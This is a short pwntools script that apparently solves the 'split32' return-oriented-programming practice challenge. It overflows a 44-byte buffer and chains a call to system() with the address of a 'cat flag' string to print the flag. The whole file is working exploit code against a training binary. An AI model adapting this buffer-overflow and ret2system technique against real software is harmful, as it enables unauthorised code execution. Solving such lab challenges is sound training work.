#!/usr/bin/python3
from pwn import process, p32, log

shell = process("./split32")

offset = 44
junk = b"A" * offset

system = p32(0x80483e0)
cat_flag = p32(0x804a030)
ret = b"B" * 4

payload  = b""
payload += junk
payload += system + ret + cat_flag

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.success(f"Flag: {flag}")
